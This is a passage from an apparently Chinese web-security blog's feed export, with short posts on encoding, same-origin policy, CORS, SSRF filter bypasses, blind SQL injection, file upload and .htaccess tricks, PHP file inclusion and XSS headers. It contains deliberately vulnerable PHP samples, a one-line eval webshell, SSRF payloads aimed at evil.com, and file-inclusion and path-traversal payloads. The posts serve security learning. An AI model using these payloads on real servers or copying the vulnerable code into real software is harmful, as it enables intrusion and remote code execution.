    <content type="text"><![CDATA[0x01 HTML形式的编码 进制编码 &#xH;(十六进制格式)、&#D;（十进制形式）、最后的分号（;）可以不要 HTML实体编码 0x02 自解码机制当用户的输入出现在HTML标签内，js执行之前会进行自解码 例如1&lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&apos;)&quot; /&gt; 这段代码在执行的过程中，会将html实体编码自解码为之前的符号，因此这段代码会执行alert(1)的弹窗]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[URL编码差异]]></title>
    <url>%2F2018%2F05%2F31%2FURL%E7%BC%96%E7%A0%81%E5%B7%AE%E5%BC%82%2F</url>
    <content type="text"><![CDATA[0x01 IE内核编码了双引号和右尖括号 0x02 Chrome编码了单引号、双引号、左右尖括号 0x03 Firefox编码了单引号、双引号、左右尖括号 0x04 相关PHP中，$_SERVER[‘QUERY_STRING’]是获取到浏览器urlencode后的内容而$_GET[‘c’]是获取urlencode之前的内容]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript常用字符串处理函数]]></title>
    <url>%2F2018%2F05%2F31%2FJavascript%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[0x01 string.charAt()参数index，返回字符串中指定位置的字符；如果超过字符串长度，则返回一个空字符串 0x02 string.charCodeAt()参数index，返回字符串指定位置的字符的unicode值 Unicode 编码单元（code points）的范围从 0 到 1114111。开头的 128 个 Unicode 编码单元和 ASCII 字符编码一样。如果指定的 index 小于 0 或大于字符串的长度，则 charCodeAt 返回 NaN。大于255的为中文 0x03 string.fromCharCode()参数一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。返回指定unicode值的字符 0x04 char.toString()此处参数是数字，返回指定字符的进制数]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript的三套编解码函数]]></title>
    <url>%2F2018%2F05%2F31%2FJavascript%E7%9A%84%E4%B8%89%E5%A5%97%E7%BC%96%E8%A7%A3%E7%A0%81%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[0x01 escape/unescape编码结果 escape不编码的字符有69个1*、+、-、.、/、@、_、0~9、a~z、A~Z escape对0~255以外的unicode值进行编码的时候输出%u**格式 0x02 encodeURI编码结果 encodeURI不编码字符有82个1!、#、$、&amp;、&apos;、(、)、*、+、-、,、.、/、@、_、~、:、;、=、?、0~9、a~z、A~Z 0x03 encodeURIComponent编码结果 encodeURIComponent不编码字符有71个1!、&apos;、(、)、*、-、.、_、~、0~9、a~z、A~Z]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同源策略]]></title>
    <url>%2F2018%2F05%2F31%2F%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[0x01 同源策略什么是同源策略？简单来说，同源策略就是同协议、同端口、同HOST。同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的关键的安全机制。对于about:blank、javascript:这种特殊的URL，他们的源继承加载他们的页面的源，他们本身不存在源这个概念。 目前，如果非同源，共有三种行为受到限制。123（1） Cookie、LocalStorage 和 IndexDB 无法读取。（2） DOM 无法获得。（3） AJAX 请求不能发送。 0x02 HTTP请求控制总体来说，页面跨域行为主要有以下三类:Cross-origin read（跨域读）Cross-origin write（跨域写）Cross-origin embedding（跨域嵌入） 一般来说，只有Cross-origin read是不允许的，其他两种是被允许的。例如Cross-origin write的links、重定向、表单提交等，Cross-origin embedding的资源嵌入，在资源嵌入中，以下例子是被允许的12345678910111213&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;`标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的`Content-Type`消息头，不同浏览器有不同的限制。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;img&gt;嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;video&gt;和 &lt;audio&gt;嵌入多媒体资源。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;object&gt;, &lt;embed&gt; 和 &lt;applet&gt;的插件。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;@font-face引入的字体。一些浏览器允许跨域字体（cross-origin fonts），一些需要同源字体（same-origin fonts）。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;frame&gt;和&lt;iframe&gt;载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。 那么当我们想要跨域读取又该怎么办呢？这是我们就得用到另一个协议CORS跨域资源共享 0x03 参考文献https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy]]></content>
      <tags>
        <tag>Web前端</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CORS（跨域资源共享）]]></title>
    <url>%2F2018%2F05%2F31%2FCORS%EF%BC%88%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x01 前言我们都知道，浏览器是遵循同源策略的，同源策略用来限制从一个源加载的文档或脚本如何与另一个源的的资源进行交互，这是一个用来隔离潜在的恶意文件的安全机制。通常来说，浏览器是允许跨域写和跨域嵌入，但是跨域读取一般是不允许的，但是这样肯定是不方便的，因此后来有了话语资源共享，用来实现跨域读的功能。 0x02 跨域资源共享跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是GET以外的 HTTP 请求，或者搭配某些 MIME 类型的POST请求）浏览器必须首先使用OPTION方法发起一个预检请求，从而获知服务端是否允许该跨域请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括COOKIE和 HTTP 认证相关数据）。 0x03 简单请求与非简单请求这里简单请求是指那些不会引起CORS预检请求的那种请求，而同理，非简单请求就是引起CORS预检请求。 简单请求 只要同时满足以下两大条件，就属于简单请求。123456789（1) 请求方法是以下三种方法之一：HEADGETPOST（2）HTTP的头信息不超出以下几种字段：AcceptAccept-LanguageContent-LanguageContent-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain 当浏览器发现请求是简单请求的时候，就会在请求头部添加一个Origin字段，该字段表示本次请求属于哪个源的，服务器会根据这个字段的值来决定是否允许跨域访问。 如果服务器不允许这个源的访问，那么服务器发送的response中，就没有Access-Control-Allow-Origin字段，当浏览器发现返回的消息中没有该字段，就知道出错了，从而抛出错误 如果服务器这个源的访问，那么服务器发送的response中，就会多出几个以Access-Control开头的字段 Access-Control-Allow-Origin 该字段是必须的，他表示允许访问的源，或者*，表示允许任意源访问。 Access-Control-Allow-Credentials 该字段是一个boolen值，如果是true，则允许发送cookie到服务器 Access-Control-Expose-Headers CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定 非简单请求 不同时满足上面的条件的就是非简单请求。 非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的请求，否则就报错。 通常来说，预检请求是OPTION请求，在头信息中，包含着Origin字段，表示来自哪个源的。除了该字段，还有两个特殊的字段： Access-Control-Request-Method 该字段表示请求的方法是什么 Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器CORS请求中出现的额外字段名。 当服务器同意了这次请求之后会在响应中添加相应的字段： Acces-Control-Allow-Origin 该字段表示允许的源 Access-Control-Allow-Method 该字段是必须的，是一个逗号分隔的字符串，表示服务器允许的跨域方法 Access-Control-Allow-Headers 如果请求中有Access-Control-Request-Headers字段的话，响应中就会有该字段，是一个逗号分隔的字符串，用来表示服务器允许的字段名。 Access-Control-Allow-Credentials 该字段也是用来表示服务器允许请求中包含cookie Access-Control-Max-Age 该字段表示本次预检请求的有效期，单位是秒。 但是如果服务器不允许请求，那么就会返回一个正常的HTTP Response给浏览器，浏览器发现响应中没有与CORS相关的字段，就知道服务器不允许这次请求，就会抛出错误。 0x04 参考文献http://www.ruanyifeng.com/blog/2016/04/cors.htmlhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF如何绕过filter_var和preg_match以及parse_url]]></title>
    <url>%2F2018%2F05%2F30%2FSSRF%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87filter-var%E5%92%8Cpreg-match%E4%BB%A5%E5%8F%8Aparse-url%2F</url>
    <content type="text"><![CDATA[0x01 前言这篇文章是在我看完一片国外安全大佬写的文章后对其进行总结并翻译得到的。 0x02 正文之绕过filter_var和preg_match本片文章主要深入一种php ssrf的技术——如何绕过例如filter_var(), preg_match()和parse_url()等函数。 本次我进行测试的php版本全部为php v5.6.30 PHP 漏洞代码12345678910111213141516171819202122232425&lt;?php echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;; //check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL))&#123; //parse URL $r = parse_url($argv[1]); print_r($r); //check if host ends with google.com if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;]))&#123; //get page from URL exec(&apos;curl -v -s &quot;&apos;.$r[&apos;host&apos;].&apos;&quot;&apos;, $a); print_r($a); &#125;else&#123; echo &quot;Error: Host not allowed&quot;; &#125; &#125;else&#123; echo &quot;Error: Invalid URL&quot;; &#125;?&gt; 这段代码里使用了filter_var()函数，preg_match()函数来进行过滤，并用parse_url()函数进行解析，最后利用exec函数执行curl命令进行访问网址。 在正式介绍绕过技术之前，我们需要了解一下以上函数的具体作用。 filter_var()filter_var — 使用特定的过滤器过滤一个变量 preg_match()该函数使用正则表达式来进行匹配特定的字符串 parse_url() ok，了解了这些函数后，说说上面的测试代码。这段代码的是获取第一个参数（这个参数是用来模拟通过$_GET或者$_POST方法获取的），然后通过filter_var()函数判断传入的url时候符合规定。如果如何规定，通过parse_url来解析这个参数，获取到host值，通过preg_match函数来判断host时候以baidu.com结尾。 运行上面的代码得到的正常结果如下： 如果不是正常的参数呢？ 1http://evil.com 绕过FILTER_VALIDATE_URL和正则表达式许多URL结构保留一些特殊的字符用来表示特殊的含义，这些符号在URL中不同的位置有着其特殊的语义。字符“;”, “/”, “?”, “:”, “@”, “=” 和“&amp;”是被保留的。除了分层路径中的点段，通用语法将路径段视为不透明。 生成URI的应用程序通常使用段中允许的保留字符来分隔。例如“；”和“=”用来分割参数和参数值。逗号也有着类似的作用。 例如，有的结构使用name;v=1.1来表示name的version是1.1，然而还可以使用name,1.1来表示相同的意思。当然对于URL来说，这些保留的符号还是要看URL的算法来表示他们的作用。 例如，如果用于hostname上，URL1http://evil.com;baidu.com 会被curl或者wget这样的工具解析为host:evil.com，querything:baidu.com 运行代码试一下 发现报错了，返回的是Invalid URL，那么因该是filter_var函数没有绕过。filter_var函数可以解析多种协议，我们可以试一下不是http的协议，例如10://evil.com;baidu.com ok,成功绕过filter_var和preg_match函数！但是我们发现它并没有解析我们的url，别担心，我们试试添加一下端口号，因为不是http的话默认端口就不是80了10://evil.com:80;baidu.com:80 ok，成功解析！ 当然，我们之前说的逗号也是可以跟分号是一个作用的 依旧成功！ 0x03 正文之绕过parse_urlparse_url函数不是用来验证URL的正确性的，而是尽可能的去解析URL，并把URL分割成特定的部分。在这种情况下，可以使用将URL的部分变为变量从而进行绕过。10://evil$baidu.com 这里，在bash中，$var是一个变量，在这个例子中$baidu这个变量未定义是个空，也就是说这个URL是0://evil&lt;空&gt;.com，也就是0://evil.com，成功绕过！ 但是这种方法也是有局限性的，因为需要利用bash中的特性，因此只有在php脚本中使用exec()、system()等命令执行的函数执行curl或者wget命令时才可以完成。 0x04 正文之data://伪协议和xss利用与上面的exec不同，这里我们使用的是filter_get_content函数，php的测试代码如下： 12345678910111213141516171819&lt;?php echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;; // check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123; // get page from URL $a = file_get_contents($argv[1]); echo($a); &#125; else &#123; echo &quot;Error: Host not allowed&quot;; &#125; &#125; else &#123; echo &quot;Error: Invalid URL&quot;; &#125;?&gt; 这次我们的任务是在响应主体中修改内容，添加一个“Hacked by Pino_HD” 1data://text/plain;base64,SGFja2VkIGJ5IFBpbm8Kbaidu.com 发现parse_url函数把text设置成了host，然后报了Host not allowed错误。但是别担心，我们可以注入一些东西到MIME类型的地方，因为php是不关心MIME类型的。。 1data://baidu.com/plain;base64,SGFja2VkIGJ5IFBpbm8K ok，成功在响应包中写入我们想要写的东西。因此我们是可以控制响应体的内容，从而形成xss]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何提高盲注的效率]]></title>
    <url>%2F2018%2F05%2F30%2F%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%95%88%E7%8E%87%2F</url>
    <content type="text"><![CDATA[0x01 SQL注入之盲注提到SQL注入，我想懂安全的小伙伴们应该都知道的，那么今天就来聊一聊关于如何提高盲注效率的问题。盲注的话大体上分为三类把。 布尔盲注 时间盲注 报错盲注 0x02 提高效率一般盲注提高效率的话有两点 减少查询次数 提高查询的正确性 那么第一种方法我想说的就是二分法 二分法的话，学过数据结构的人都懂的，答题思路我用如下python代码来做介绍： 123456def inject(a, list, start, end): if start == end: return list[start] if ord(a) &gt; list[(start+end)/2]: return inject(a, list, end/2, end) return inject(a, list, start, end/2) 这里我解释一下上述的代码。这里a是要查询的那一位字符，list是a-zA-Z0-9这种用来对比的字符串，start是开始，end是结束。进入函数，如果start等于end说明找到了，返回那个字符，如果a的ascii值大于list的中间字符的ascii，说明a的真正值在list的后半部分，因此start变为end／2；否则的话就是a的值在list的前半部分，因此end变成end／2 第二种方法就是位运算法 原理就是每次查询确定一位，这样一个字符只需要8次就可以确定了，利用位运算符&amp;，可以通过bin(ascii(‘a’))&amp;1,2,4,8,16…来获取8位二进制]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令执行时管道符和AND符的区别]]></title>
    <url>%2F2018%2F05%2F30%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%B6%E7%AE%A1%E9%81%93%E7%AC%A6%E5%92%8CAND%E7%AC%A6%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[0x01 管道符管道符只能显示最后一个命令的正确输出结果，如图： 0x02 &amp;符号&amp;符号可以显示所有命令的正确输出结果 0x03 总结在命令执行的时候使用管道符不能看到中间命令的结果，因此需要视情况而定。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[.htaccess攻击]]></title>
    <url>%2F2018%2F05%2F30%2Fhtaccess%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[0x01 前言有的时候由于各种名单的原因，可能我们只能上传任何php文件，而且还没有其他地方来解析成php，咋办？如果你能上传.htaccess文件的话，那么就很好办了。 0x02 .htaccess攻击建一个.htaccess 文件，里面的内容如下：123&lt;FilesMatch &quot;pino&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 这个时候就上传一个文件名字是pino，这个时候我们上传一个文件名字叫做pino的文件，不要后缀名，然后里面是一句话木马，用菜刀连接，可以成功！]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP文件上传漏洞]]></title>
    <url>%2F2018%2F05%2F30%2FPHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x01 文件上传漏洞文件上传漏洞顾名思义就是用户上传一个可执行的脚本文件，获得了执行服务器端命令的能力。通常，文件上传是getshell最常用、最直接的方式了。但是，文件上传本身是一个正常的业务需求，因此问题在于如何安全的上传。 0x02 文件上传的触发条件 上传的文件被Web容器解释执行 用户能够从web页面访问到被上传的文件（直接或间接） 用户上传的文件通常不能被网站程序压缩、修改内容 0x03 从防御的角度看上传通常防御文件上传漏洞是分几个点的，大体上就以下几方面 1. 客户端javascript校验 在浏览加载文件，但还未点击上传按钮时变弹出对话框，内容可能是“只允许上传xxx后缀名的文件”之类的，而此时并没有发送数据包。 绕过方法： 关闭浏览器的javascript功能 用burp抓包改后缀名 2. 检测MIME 类型 · 客户端判断：1$_FILES[&apos;myfile&apos;][&apos;type&apos;] == &apos;image/jpeg&apos; · 服务端判断：12$fileinfo = finfo_open(FILEINFO_MIME);$mimetype = finfo_file($fileinfo, $file_true_name); 绕过方法： 用burp抓包，修改Content-Type 3. 检查内容 服务器端会读取上传的文件然后判断文件内容时候有&lt;?php之类的 绕过方法： 1. 12&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;` 如果检查文件头的话就就可以找张真正的图片然后用winhex在图片的末尾写php代码 4. 检查文件扩展名 一般检查文件扩展名为最直接有效的方法，通常是基于白名单或者黑名单来实现的。 黑名单绕过 可以使用能够被解析的其他文件扩展名 1234jsp jspx jspfasp asa cer aspxphp phtml php3 php4 php5 PHP phtmexe exee 特殊文件名绕过比如在上传的时候改成test.asp.或者test.asp_(下划线为空格，这里方便大家看用下划线表示了)，这种命名方式在windows下是不允许的，绕过验证后windows系统自动去掉后面的点和空格，但要注意Unix/Linux是没有这个特性的。 00截断有的时候可能会遇到服务器端把后缀名已经定好了，而恰好别的地方有一个可以任意读取php文件的服务，这个时候可以把图片马上传后在这里查看，查看的时候用%00把后面的.php给截断就好了 .htaccess文件攻击配合名单列表绕过，上传一个自定义.htaccess文件，即可轻松绕过各种检测。 解析漏洞绕过这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析漏洞即可 白名单绕过 %00截断跟之前说的很像，就是上传一个比如shell.php%00.jpg，服务器检测后缀名是.jpg，但实际上已经被截断了。 解析漏洞利用这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析漏洞 .htaccess文件攻击配合名单列表绕过，上传一个自定义.htaccess文件，即可轻松绕过 0x04 与文件上传息息相关的解析漏洞 IIS5.x-6.x解析漏洞 •使用iis5.x-6.x版本的服务器，大多为windowsserver2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。 •目录解析(IIS6.0)，只要文件夹有asp的话，该目录下所有文件都会当作asp来解析1www.xxx.com/xx.asp/xx.jpg（xx.asp要存在） 1www.xxx.com/xx.asp;.jpg 服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。(xx.asp;.jpg为上传文件) IIS的PUT上传 PUT是在WebDav中定义的一个方法，允许用户上传文件到指定目录。在许多WebServer中都默认禁用了此方法，或者对上传做了严格限制。但在IIS中，如果目录支持写权限，同时开启了WebDav，就会支持PUT，再结合MOVE方法，可Getshell。 apache解析漏洞 Apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.owf.rar“.owf”和”.rar”这两种后缀是apache不可识别解析,apache就会把test.php.owf.rar解析成php 1www.xxxx.xxx.com/test.php.php123 Apache的httpd.conf的AddHandler php5-script .php这时只要文件名里包含.php即使文件名是test2.php.jpg也会以php来执行。（配置错误） nginx解析漏洞(Nginx&lt;8.03) •当cgi.fix_pathinfo开启时（为1） •当访问www.xx.com/phpinfo.jpg/1.php时，会将phpinfo.jpg当做php进行解析 •其中1.php是一个不存在的文件 0x05 参考 某大佬的PPT 文件上传框架]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP文件包含漏洞]]></title>
    <url>%2F2018%2F05%2F30%2FPHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x01 文件包含函数 include() include_once() require() require_once() 这里include()函数如果在包含的过程中发生错误，会发出警告，但是会继续执行后续代码；require()函数如果在包含的过程中发生错误，会报错退出，并且不再执行之后的代码。include_once()和require_once()的功能跟include()和require()类似，只不过前者如果已经包含了文件，那么就不会包含第二次，以免出现函数重定义或变量重赋值的问题。 以上四个函数不管包含的文件类型是什么，都会当作php文件进行解析，例如phpinfo.txt12&lt;?phpphpinfo(); lfi.php1234&lt;?php$temp=$_GET[&apos;c&apos;];include($temp);?&gt; 成功执行phpinfo()！ 0x02 文件包含分类1. LFI（本地文件包含） 本地文件包含就是包含服务器本地的文件。 2. RFI（远程文件包含） 远程文件包含就是包含远程服务器上的文件，这样我们就可以自定义自己想要执行的代码，因此危害比较大。远程文件包含需要一定的条件php.ini配置12allow_url_fopen=On（默认开启）allow_url_include=On（默认关闭） 0x03 php伪协议假设服务器lfi.php内容如下1234&lt;?php$temp = $_GET[&apos;c&apos;];include($temp);?&gt; php://input 使用条件12allow_url_include=On（默认关闭）allow_url_fopen不做要求（默认开启） php://filter 使用条件：无 ··？c=php://filter/read=convert.base64-encode/resource=xxx或者?c=php://filter/convert.base64-encode/resource=xxx···通过指定resource的值来读取文件，读取的文件是base64加密后的，读取到后解一下就好了。 phar://* 使用条件：php版本大于等于5.3.0 假设需要读取的文件是phpinfo.txt，将其压缩成zip文件（phpinfo.zip） 然后指定文件的绝对路径1?c=phar://C://wamp64/www/phpinfo.zip/phpinfo.txt 或者使用相对路径（这里phpinfo.zip就在当前路径）1?c=phar://phpinfo.zip/phpinfo.txt zip:// 使用条件：php版本大于等于5.3.0 zip://与phar://的使用类似，但是需要绝对路径， zip文件后面要跟%23加zip文件里的文件 1?c=zip://C:/wamp64/www/phpinfo.zip%23phpinfo.txt data:URL schema 使用条件：php版本大于等于5.2.0allow_url_include=On(默认关闭)allow_url_fopen=On(默认开启) 1?c=data:text/plain,&lt;?php phpinfo();?&gt; 或者1?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b session文件包含 使用条件：session文件路径已知，并且内容部分可控 session文件路径可以在phpinfo中session.save_path得到 一般情况下session文件都在/tmp目录下命名格式：sess_[phpsessid]，而phpsessid可以在cookie中得到 要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。 包含日志文件 使用条件： 需要知道日志文件的目录，并且日志文件可读 当我们访问服务器的时候，访问的请求会被记录到access.log，当发生错误的时候会把错误写入到error.log，一般日志的路径linux下是/var/logs/apache2，windows下wamp在/wamp/logs但是如果我们直接请求的话，一些特殊字符会被url编码从而导致包含后无法解析 可以用burp抓包后改包即可。 之后就可以包含进行利用啦 包含ssh-log 使用条件：ssh日志路径已知，并且可读，默认情况下在/var/log/auth.log 1ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost 之后密码随便写之后包含日志文件就好啦 environ 使用条件： php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。 条件竞争 0x04 绕过姿势指定前缀1234&lt;?php$file = $_GET[&apos;file&apos;];include &apos;/var/www/html/&apos;.$file;?&gt; 目录遍历 可以用../进行目录遍历，访问其他目录的文件 编码 但有的时候，服务器通常会把../过滤掉，这个时候可以用编码进行绕过利用url编码%2e%2e%5c..%5c%2e%2e\%2e%2e%2f..%2f%2e%2e/../..\ 二次编码%252e%252e%255c%252e%252e%252f../..\ 容器/服务器的编码方式../..%c0%af%c0%ae%c0%ae/注：Why does Directory traversal attack %C0%AF work? %c0%ae%c0%ae/注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）Apache Tomcat Directory Traversal..\..%c1%9c 指定后缀1234&lt;?php$file = $_GET[&apos;file&apos;];include $file.&apos;/test/test.php&apos;;?&gt; ?问号绕过1index.php?file=http://remoteaddr/remoteinfo.txt? 问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。注意需要把#进行url编码为%23。 利用zip协议 可以构造跟后缀一样的路径，再打包成zip文件，然后利用zip协议包含即可]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS防御说]]></title>
    <url>%2F2018%2F05%2F30%2FXSS%E9%98%B2%E5%BE%A1%E8%AF%B4%2F</url>
    <content type="text"><![CDATA[0x01 HTTP响应的X-头部1. x-frame-options x-frame-options的值有两个： deny（禁止被加载到任何frame中） sameorigin（仅允许被加载进同域内的frame） 2. x-xss-protection x-xss-protection的值有三个： 0（表示禁用这个策略） 1（默认，对危险脚本做一些标志或修改，以阻止在浏览器上渲染执行，Chrome和IE在这方面的行为是有差异的） 1;mode=block（强制不渲染，在Chrome下直接跳转到空白页，在IE下返回一个#符号） 这个策略仅针对反射型xss，对付不了存储型xss，能识别反射型是因为提交请求的URL中带有可疑的xss代码片段。 3. x-content-security-policy（俗称CSP） CSP策略由一些指令构成，每个指令以分号分隔，语法格式：1x-content-security-policy:[指令1][指令值1];[指令2][指令值2]... 指令分类： defualt-src（以下值中的单引号必须有） 该指令的值会影响一下所有指令，支持通配符来表明外部资源的来源 &apos;none&apos;表示一个空集合，即表示外部资源不允许被加载 &apos;self&apos;表示匹配同域的资源，即只有同域内的资源允许被加载 &apos;unsafe-inline&apos;表示允许内核的javascript/css，如&lt;script&gt;里的，javascript:里的、on事件里的、&lt;style&gt;事件里的等。 &apos;unsafe-eval&apos;表示允许eval/setTimeout/setInterval/Function等可以直接执行字符串的函数。除此之外，还有一个data指令值，允许data:协议。 **注意以上指令值都以空格分隔** script-src 表示脚本的来源，指令值同default-src object-src 表示&lt;object&gt;&lt;embed&gt;&lt;applet&gt;等对象的来源，指令值同default-src img-src 表示&lt;img&gt;的来源，指令值同default-src media-src 表示&lt;audio&gt;&lt;vedio&gt;的来源，指令值同default-src frame-src 表示&lt;frame&gt;&lt;iframe&gt;的来源，指令值同default-src font-src 表示@font-face字体的来源，指令值同default-src connect-src 表示XMLHttpRequest、WebSocket等跨域的来源，指令值同default-src style-src 表示样本来源，指令值同default-src]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS输出点总结]]></title>
    <url>%2F2018%2F05%2F30%2FXSS%E8%BE%93%E5%87%BA%E7%82%B9%E6%80%BB%E7%BB%93%2F</url>
